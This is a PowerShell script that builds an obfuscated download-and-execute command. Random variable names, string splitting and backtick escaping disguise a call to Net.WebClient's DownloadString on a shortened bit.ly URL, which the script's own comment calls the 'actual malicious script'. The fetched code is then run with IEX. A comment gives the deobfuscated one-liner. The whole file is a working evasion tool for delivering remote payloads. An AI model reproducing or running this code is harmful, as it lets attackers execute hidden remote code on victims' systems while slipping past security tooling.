#URL of actual malicious script
$URL = 'http://bit.ly/2jvG3yR'


#This section generates random numbers to be used as variable names
$Hash = @{}

Do
{
   $a = Get-Random -Minimum 30 -Maximum 1000
   Try { $hash.add($a,$a) } Catch {}
   $a = $null
} 
While ( $hash.count -le 30 )

$variValues = @{}
$variValues = $hash.Values -split "/n"


#Slice and dice the URL for parameterization
$URL1 = $url.Substring(0,2) #Fixed should be "ht"
$URL2 = $url.Substring(2,($URL.IndexOf(".")-4))
$URL3 = $url.Substring(($URL.IndexOf(".")-2),4) #Grabs the 3 Characters around the "."
$URL4 = $url.Substring(($URL.IndexOf(".")+2)) #Rest of URL String

#Build obfuscated command
$command = "sv "+ $variValues[0] + " '`N';sv "+ $variValues[1] + " '`e`T';sv "+ $variValues[2] + " '.`W`e';sv "+ $variValues[3] + " '`B';sv "+ $variValues[4] + " '`C';sv "+ $variValues[5] + " '`li`e';sv "+ $variValues[6] + " '`N`T';sv "+ $variValues[8] + " '`D`o';sv "+ $variValues[9] + " '`w`N`l';sv "+ $variValues[10] + " '`o`A`d`S`T';sv "+ $variValues[11] + " '`R`i`N`g';sv "+ $variValues[13] + " '$URL1';sv "+ $variValues[14] + " '$URL2';sv "+ $variValues[15] + " '$URL3';sv "+ $variValues[16] + " '$URL4';sv "+ $variValues[18] + " 'I';sv "+ $variValues[19] + " 'E';sv "+ $variValues[20] + " 'X';sv "+ $variValues[7] + " ((gv "+ $variValues[0] + ").value.toString()+(gv "+ $variValues[1] + ").value.toString()+(gv "+ $variValues[2] + ").value.toString()+(gv "+ $variValues[3] + ").value.toString()+(gv "+ $variValues[4] + ").value.toString()+(gv "+ $variValues[5] + ").value.toString()+(gv "+ $variValues[6] + ").value.toString());sv "+ $variValues[17] + " ((gv "+ $variValues[13] + ").value.toString()+(gv "+ $variValues[14] + ").value.toString()+(gv "+ $variValues[15] + ").value.toString()+(gv "+ $variValues[16] + ").value.toString());sv "+ $variValues[12] + " ((gv "+ $variValues[8] + ").value.toString()+(gv "+ $variValues[9] + ").value.toString()+(gv "+ $variValues[10] + ").value.toString()+(gv "+ $variValues[11] + ").value.toString());sv "+ $variValues[21] + " ((gv "+ $variValues[18] + ").value.toString()+(gv "+ $variValues[19] + ").value.toString()+(gv "+ $variValues[20] + ").value.toString());``I``E``X (``N``e``w``-``Ob``j``e``c``T(gv "+ $variValues[7] + ").value.toString()).((gv "+ $variValues[12] + ").value.tostring())((gv "+ $variValues[17] + ").value.tostring())"
#Deobfuscated command = "sv $1 '`N';sv $2 '`e`T';sv $3 '.`W`e';sv $4 '`B';sv $5 '`C';sv $6 '`li`e';sv $7 '`N`T';sv $9 '`D`o';sv $10 '`w`N`l';sv $11 '`o`A`d`S`T';sv $12 '`R`i`N`g';sv $8 ((gv $1).value.toString()+(gv $2).value.toString()+(gv $3).value.toString()+(gv $4).value.toString()+(gv $5).value.toString()+(gv $6).value.toString()+(gv $7).value.toString());sv DL ((gv $9).value.toString()+(gv $10).value.toString()+(gv $11).value.toString()+(gv $12).value.toString());IEX (New-Object (gv $8).value.toString()).((gv DL).value.tostring())('http://bit.ly/2jvG3yR')"
Write-Output $command
